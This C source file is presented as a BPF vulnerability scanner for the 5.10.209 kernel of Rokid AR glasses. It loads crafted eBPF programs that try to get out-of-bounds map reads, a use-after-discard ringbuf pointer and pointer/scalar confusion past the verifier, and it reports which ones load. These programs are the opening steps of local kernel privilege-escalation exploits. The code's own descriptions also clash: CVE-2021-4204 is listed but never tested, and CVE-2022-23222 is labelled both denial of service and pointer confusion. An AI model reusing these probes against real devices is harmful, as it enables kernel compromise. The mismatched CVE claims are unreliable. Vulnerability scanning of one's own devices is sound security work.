/*
 * BPF Vulnerability Scanner for Kernel 5.10.x
 * Target: Rokid AR Glasses (5.10.209)
 *
 * Tests known BPF vulnerabilities that affect 5.10.x:
 * - CVE-2021-3490 (ALU32 bounds tracking)
 * - CVE-2021-3489 (Ringbuf callback abuse)
 * - CVE-2021-4204 (BPF BTF validation)
 * - CVE-2022-23222 (BPF local DoS)
 * - CVE-2023-2163 (BPF verifier bounds)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>

#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU32_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_ALU32_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV32_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_LD_MAP_FD(DST, FD)                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_STX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_LDX_MEM(SZ, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_ST_MEM(SZ, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SZ) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})
#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT})

#define BPF_SIZE(code) ((code) & 0x18)

static char log_buf[131072];

int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_array_map(int value_size, int max_entries)
{
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = value_size;
    attr.max_entries = max_entries;
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_bpf_prog(struct bpf_insn *insns, int insn_cnt, int *log_level)
{
    memset(log_buf, 0, sizeof(log_buf));
    union bpf_attr attr = {0};
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (unsigned long)insns;
    attr.insn_cnt = insn_cnt;
    attr.license = (unsigned long)"GPL";
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = log_level ? *log_level : 1;

    return bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
}

/*
 * CVE-2021-3490: ALU32 bounds tracking issue
 *
 * In vulnerable kernels, 32-bit operations don't properly
 * update 64-bit bounds tracking, allowing OOB access.
 */
void test_cve_2021_3490(int map_fd)
{
    printf("\n=== CVE-2021-3490 (ALU32 Bounds) ===\n");

    struct bpf_insn prog[] = {
        /* Get pointer to map value */
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1), /* map_lookup_elem */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 15),

        /* r6 = unbounded scalar from map */
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),

        /* 32-bit operation: w6 &= 1 */
        /* After this, r6 should be 0 or 1, but due to bug... */
        BPF_ALU32_IMM(BPF_AND, BPF_REG_6, 1),

        /* r6 *= 0x100000000 (should be 0 or 0x100000000) */
        /* But verifier might think it's still 0 or 1 */
        BPF_MOV64_IMM(BPF_REG_7, 1),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),
        BPF_ALU64_REG(BPF_MUL, BPF_REG_6, BPF_REG_7),

        /* Try to use r6 as array index */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_6),

        /* Read from computed address */
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0),

        /* Store result back */
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(), /* null path */
    };

    int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), NULL);
    if (fd >= 0)
    {
        printf("  [!!!] VULNERABLE - Program loaded!\n");
        close(fd);
    }
    else
    {
        printf("  [OK] Patched (errno=%d)\n", errno);
        /* Show first error line */
        char *newline = strchr(log_buf, '\n');
        if (newline)
            *newline = 0;
        printf("  Verifier: %s\n", log_buf);
    }
}

/*
 * CVE-2021-3489: Ringbuf reference counting
 *
 * Test for improper handling of ringbuf callbacks.
 */
void test_cve_2021_3489(void)
{
    printf("\n=== CVE-2021-3489 (Ringbuf Callback) ===\n");

    /* Create ringbuf */
    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.max_entries = 4096;
    int rb_fd = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));

    if (rb_fd < 0)
    {
        printf("  Cannot create ringbuf\n");
        return;
    }

    struct bpf_insn prog[] = {
        /* Reserve from ringbuf */
        BPF_LD_MAP_FD(BPF_REG_1, rb_fd),
        BPF_MOV64_IMM(BPF_REG_2, 64),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 131), /* ringbuf_reserve */

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 8),

        /* Save pointer */
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        /* Discard it */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 133), /* ringbuf_discard */

        /* Try to use the freed pointer (should fail) */
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(), /* null path */
    };

    int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), NULL);
    if (fd >= 0)
    {
        printf("  [!!!] VULNERABLE - Use after discard allowed!\n");
        close(fd);
    }
    else
    {
        printf("  [OK] Patched (errno=%d)\n", errno);
        char *newline = strchr(log_buf, '\n');
        if (newline)
            *newline = 0;
        printf("  Verifier: %.100s\n", log_buf);
    }

    close(rb_fd);
}

/*
 * CVE-2022-23222: Pointer type confusion
 */
void test_cve_2022_23222(int map_fd)
{
    printf("\n=== CVE-2022-23222 (Pointer Confusion) ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 8),

        /* r6 = map_value pointer */
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        /* Convert pointer to scalar via XOR with itself */
        BPF_ALU64_REG(BPF_XOR, BPF_REG_6, BPF_REG_6),

        /* Now r6 should be 0, but type might be confused */
        /* Try to add it to pointer and access */
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_6),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(),
    };

    int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), NULL);
    if (fd >= 0)
    {
        printf("  [INFO] Program loaded (need further analysis)\n");
        close(fd);
    }
    else
    {
        printf("  [OK] Rejected (errno=%d)\n", errno);
    }
}

/*
 * CVE-2023-2163: Verifier precision marking
 */
void test_cve_2023_2163(int map_fd)
{
    printf("\n=== CVE-2023-2163 (Precision Marking) ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 20),

        /* r6 = unbounded scalar */
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        /* Complex conditional that might confuse precision tracking */
        BPF_JMP_IMM(BPF_JGT, BPF_REG_6, 100, 2),
        BPF_JMP_IMM(BPF_JA, 0, 0, 3),
        BPF_JMP_IMM(BPF_JLT, BPF_REG_6, 50, 1),
        BPF_MOV64_IMM(BPF_REG_6, 0),

        /* After merge, bounds might be imprecise */
        BPF_JMP_IMM(BPF_JLE, BPF_REG_6, 100, 1),
        BPF_MOV64_IMM(BPF_REG_6, 0),

        /* Use as array index */
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6),
        BPF_LDX_MEM(BPF_B, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(),
    };

    int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), NULL);
    if (fd >= 0)
    {
        printf("  [INFO] Program loaded (need OOB test)\n");
        close(fd);
    }
    else
    {
        printf("  [OK] Rejected (errno=%d)\n", errno);
    }
}

/*
 * Test: Sign extension issues in BPF_MOVSX (if available)
 */
void test_sign_extension(int map_fd)
{
    printf("\n=== Sign Extension Issues ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 10),

        /* Load 32-bit value */
        BPF_LDX_MEM(BPF_W, BPF_REG_6, BPF_REG_0, 0),

        /* Test sign extension behavior */
        /* If value is 0xFFFFFFFF, after sign extension it becomes -1 */
        BPF_JMP32_IMM(BPF_JEQ, BPF_REG_6, -1, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        /* In 64-bit comparison, should also be -1 */
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_6, -1, 1),
        BPF_MOV64_IMM(BPF_REG_6, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(),
    };

    int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), NULL);
    printf("  Load result: fd=%d errno=%d\n", fd, errno);
    if (fd >= 0)
        close(fd);
}

/*
 * Test: JMP32 vs JMP64 comparison discrepancy
 */
void test_jmp32_jmp64(int map_fd)
{
    printf("\n=== JMP32 vs JMP64 Discrepancy ===\n");

    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, 1),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 12),

        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),

        /* JMP32: compare lower 32 bits */
        /* If lower 32 bits <= 8, proceed */
        BPF_JMP32_IMM(BPF_JLE, BPF_REG_6, 8, 1),
        BPF_JMP_IMM(BPF_JA, 0, 0, 5),

        /* Verifier thinks r6 <= 8, but upper 32 bits are unknown */
        /* On 5.10.x, this should be properly tracked */
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_6),
        BPF_LDX_MEM(BPF_B, BPF_REG_7, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(),
        BPF_EXIT_INSN(),
    };

    int fd = load_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), NULL);
    printf("  Load result: fd=%d errno=%d\n", fd, errno);
    if (fd >= 0)
        close(fd);
}

int main(void)
{
    setbuf(stdout, NULL);

    printf("===========================================\n");
    printf("BPF Vulnerability Scanner\n");
    printf("Target: Kernel 5.10.209 Rokid AR\n");
    printf("===========================================\n");

    /* Create test map */
    int map_fd = create_array_map(256, 1);
    if (map_fd < 0)
    {
        printf("Failed to create map: %d\n", errno);
        return 1;
    }
    printf("Test map fd=%d\n", map_fd);

    /* Initialize map with test value */
    int key = 0;
    unsigned long val = 0x100000001UL; /* Test value for bounds issues */
    union bpf_attr attr = {0};
    attr.map_fd = map_fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)&val;
    bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

    /* Run vulnerability tests */
    test_cve_2021_3490(map_fd);
    test_cve_2021_3489();
    test_cve_2022_23222(map_fd);
    test_cve_2023_2163(map_fd);
    test_sign_extension(map_fd);
    test_jmp32_jmp64(map_fd);

    close(map_fd);

    printf("\n===========================================\n");
    printf("Scan Complete\n");
    printf("===========================================\n");

    return 0;
}
